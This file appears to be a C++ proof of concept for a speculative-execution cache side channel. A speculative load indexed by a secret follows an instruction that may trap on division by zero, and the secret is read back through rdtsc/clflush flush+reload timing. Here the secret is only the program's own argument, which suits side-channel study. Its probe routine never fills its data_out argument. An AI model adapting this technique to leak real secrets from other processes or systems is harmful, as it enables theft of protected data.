#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
#include <iostream>

using namespace std;

const size_t CACHE_LINE_SIZE = 4096;
const size_t MAX_SEND_VALUE = 8;

void setup_signal_handler();
int clear_cache();

uint8_t *cache;

int probe(uint8_t *adrs, uint8_t* data_out) {
    volatile unsigned long time;

    asm __volatile__ (
                " mfence \n"
                " lfence \n"
                " rdtsc \n"
                " lfence \n"
                " movl %%eax, %%esi \n"
                " movl (%1), %%eax \n"
                " lfence \n"
                " rdtsc \n"
                " subl %%esi, %%eax \n"
                " clflush 0(%1) \n"
                : "=a" (time)
                : "c" (adrs)
                : "%esi", "%edx");
    return time;
}

void recovery_secret(int sig)
{
    int times[MAX_SEND_VALUE];
    int sum = 0;

    for(int i=0;i<MAX_SEND_VALUE;i++)
    {
        uint8_t data;

        times[i] = probe(cache + CACHE_LINE_SIZE*i, &data);
        sum += data;
    }

    for(int i=0;i<MAX_SEND_VALUE;i++)
    {
        cout<<i<<": "<<times[i]<<endl;
    }

    exit(sig);
}

int try_rise_exception(int div)
{
    int a=div;
    for(int i=0;i<10000;i++)
        a+=i;

    return a / div;
}

int speculative_transfer(int div, uint8_t secret)
{
    uint8_t data = 0;
    int res = 0;
    data = try_rise_exception(div);
    res += cache[CACHE_LINE_SIZE*secret];

    return res + data;
}

int main(int argc, char *argv[])
{
    cout<<"start app\n";

    // setup cached memory
    cache = (uint8_t*)aligned_alloc(CACHE_LINE_SIZE, CACHE_LINE_SIZE*MAX_SEND_VALUE);
    memset(cache, 0, CACHE_LINE_SIZE*MAX_SEND_VALUE);

    setup_signal_handler();

    // input data
    char *p;
    int BRANCH_PREDICTOR_TRAIN_COUNT = strtol(argv[1], &p, 10);
    uint8_t secret = (uint8_t) strtol(argv[2], &p, 10);
    cout<<"train: "<<BRANCH_PREDICTOR_TRAIN_COUNT-1<<" secret: "<<(int)secret<<endl;

    // run
    int result = clear_cache();
    for(int i=1;i<=BRANCH_PREDICTOR_TRAIN_COUNT;i++)
    {
        result += speculative_transfer(BRANCH_PREDICTOR_TRAIN_COUNT-i, secret);
        result += clear_cache();
    }
    cout<<"result: "<<result<<endl;

    recovery_secret(0);

    return result;
}

void setup_signal_handler()
{
    struct sigaction act;
    memset(&act, 0, sizeof(act));
    act.sa_handler = recovery_secret;

    sigset_t set;
    sigemptyset(&set);
    sigaddset(&set, SIGFPE);

    act.sa_mask = set;
    sigaction(SIGFPE, &act, 0);
}

int clear_cache()
{
    for(int i=0;i<MAX_SEND_VALUE;i++)
        __builtin_ia32_clflush(cache + CACHE_LINE_SIZE*i);
    return 0;
}
